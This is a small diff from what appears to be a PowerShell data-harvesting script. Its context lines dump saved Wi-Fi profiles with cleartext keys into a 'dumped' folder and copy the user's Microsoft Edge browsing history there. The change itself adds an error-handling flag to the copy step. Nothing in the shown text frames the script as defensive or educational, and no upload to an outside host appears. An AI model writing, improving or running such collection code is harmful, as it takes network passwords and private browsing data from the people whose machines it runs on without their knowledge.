@@ -14,4 +14,4 @@ Netsh wlan show profile name=$networkname key=clear > dumped/networkinfo.txt
 
 $origin_edge_path="C:\Users\$Env:UserName\AppData\Local\Microsoft\Edge\User Data\Default\History"
 $edgehistorycopypath="dumped\edge"
-Copy-Item -Path $origin_edge_path -Destination $edgehistorycopypath -Force
+Copy-Item -Path $origin_edge_path -Destination $edgehistorycopypath -Force -ErrorAction Continue
